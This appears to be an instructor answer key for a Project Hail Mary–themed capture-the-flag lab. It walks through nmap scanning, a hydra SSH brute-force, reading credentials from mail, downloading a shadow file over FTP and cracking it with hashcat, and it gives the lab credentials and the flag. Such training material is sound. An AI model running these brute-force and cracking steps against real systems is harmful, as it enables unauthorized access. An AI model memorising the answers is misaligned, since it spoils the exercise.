# Project Hail Mary — Lost Signal
## Challenge Walkthrough (Instructor Answer Key)

> Replace `N` with your team number throughout (e.g. team 3 uses `10.7.3.x`).

---

## Step 1 — Network Enumeration

Discover what hosts and services are available on your team's subnet.

```bash
nmap -sV 10.7.N.0/24
```

**Expected output:**
```
Nmap scan report for 10.7.N.1
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2 (Debian)

Nmap scan report for 10.7.N.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3

Nmap scan report for 10.7.N.3
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2 (Debian)
```

Three hosts. Two SSH servers, one FTP server. The FTP server is the odd one out — start there, or start with SSH brute-force on the first host.

---

## Step 2 — Brute-Force SSH on `sol` (10.7.N.1)

You don't have credentials yet. Use `hydra` with `rockyou.txt` to brute-force the SSH login.
The username to target is `ryland` (a name from the mission manifest).

```bash
hydra -l ryland -P /usr/share/wordlists/rockyou.txt ssh://10.7.N.1
```

**Expected output:**
```
[22][ssh] host: 10.7.N.1   login: ryland   password: microbiology
```

**Credentials found:** `ryland:microbiology`

> **Note:** This will take several minutes. The password appears around line 169,000 of rockyou.txt.

---

## Step 3 — Log Into `sol` and Read the Mail

SSH into `sol` using the credentials you just found.

```bash
ssh ryland@10.7.N.1
```

Once logged in, check the user's mail:

```bash
cat /var/mail/ryland
```

**Expected output:**
```
From: ryland.grace@astrophage-project.net
To: stratt@astrophage-project.net
Date: Mon, 14 Nov 2022 09:12:44 +0000
Subject: FTP access to tau-ceti relay

Stratt,

The spectrometer logs from the Tau Ceti observation window are ready.
I pushed them to the relay server (tau-ceti) under your account.

FTP credentials (don't share these — I'm serious):
  user: stratt
  pass: petrova

The shadow archive is in your home directory. Cross-ref against the
Eridani dataset and let me know if you see the same Astrophage bloom
signature we detected at 40 Eridani last cycle.

– Ryland
```

**New credentials:** `stratt:petrova` on `tau-ceti`

Exit the SSH session:

```bash
exit
```

---

## Step 4 — FTP Into `tau-ceti` and Download the Shadow File

Connect to the FTP server using the credentials from the email.

```bash
ftp 10.7.N.2
```

When prompted:
```
Name: stratt
Password: petrova
```

List files and download the shadow file:

```bash
ftp> ls
ftp> get shadow
ftp> bye
```

**Expected output from `ls`:**
```
-rw-r--r--    1 1000     1000           60 Nov 14 09:15 shadow
```

The file is now on your local machine. Read it:

```bash
cat shadow
```

**Expected output:**
```
rocky:$1$hailmary$3Q.jtfyjzx8FjZ5UGLFY3/:19000:0:99999:7:::
```

This is an MD5crypt hash (`$1$`) for user `rocky`. You need to crack it.

---

## Step 5 — Crack the Hash with Hashcat

The hash type `$1$` is MD5crypt — hashcat mode **500**.

```bash
hashcat -m 500 shadow /usr/share/wordlists/rockyou.txt
```

**Expected output:**
```
$1$hailmary$3Q.jtfyjzx8FjZ5UGLFY3/:adrian
```

**Password cracked:** `rocky:adrian`

> **Note:** If hashcat has already cracked this hash, use `--show` to display the result:
> ```bash
> hashcat -m 500 shadow /usr/share/wordlists/rockyou.txt --show
> ```

---

## Step 6 — SSH Into `eridani` (10.7.N.3)

```bash
ssh rocky@10.7.N.3
```

> **Note:** `eridani` has `MaxAuthTries 3` — brute-forcing is not viable. You must use the cracked password.

---

## Step 7 — Find the Flag

List the home directory:

```bash
ls
```

**Expected output:**
```
astrophage_data.txt
```

Read it:

```bash
cat astrophage_data.txt
```

**Expected output:**
```
Nice try. Look closer.
```

This is a decoy. Look for hidden files:

```bash
ls -a
```

**Expected output:**
```
.  ..  .astrophage_data.txt  .bash_logout  .bashrc  .profile  astrophage_data.txt
```

There it is — `.astrophage_data.txt`. Read it:

```bash
cat .astrophage_data.txt
```

**Expected output:**
```
[CLASSIFIED — HAIL MARY PROJECT — RESTRICTED DISTRIBUTION]

ASTROPHAGE CONFIRMED: 40 ERIDANI SYSTEM
Observation cycle 7, solar flux anomaly +3.1% above baseline.
Spectrometer readings consistent with Astrophage microorganism absorption
signature at 25.984 THz. Bloom density estimated 2.4x Tau Ceti reference levels.

This system is further along than we thought. Rocky's numbers don't lie.

>> FLAG{astrophage_confirmed_tau_ceti_e} <<
```

---

## Flag

```
FLAG{astrophage_confirmed_tau_ceti_e}
```

---

## Full Command Summary

```bash
# 1. Enumerate
nmap -sV 10.7.N.0/24

# 2. Brute-force sol
hydra -l ryland -P /usr/share/wordlists/rockyou.txt ssh://10.7.N.1

# 3. Read mail on sol
ssh ryland@10.7.N.1
cat /var/mail/ryland
exit

# 4. FTP tau-ceti, grab shadow
ftp 10.7.N.2          # login: stratt / petrova
get shadow
bye
cat shadow

# 5. Crack the hash
hashcat -m 500 shadow /usr/share/wordlists/rockyou.txt

# 6. SSH eridani
ssh rocky@10.7.N.3    # password: adrian

# 7. Find flag
ls -a
cat .astrophage_data.txt
```

---

## Credential Chain

| Host       | IP          | Service | Username  | Password       | How Obtained          |
|------------|-------------|---------|-----------|----------------|----------------------|
| `sol`      | 10.7.N.1    | SSH     | `ryland`  | `microbiology` | hydra + rockyou.txt  |
| `tau-ceti` | 10.7.N.2    | FTP     | `stratt`  | `petrova`      | email on sol         |
| `eridani`  | 10.7.N.3    | SSH     | `rocky`   | `adrian`       | hashcat on shadow    |
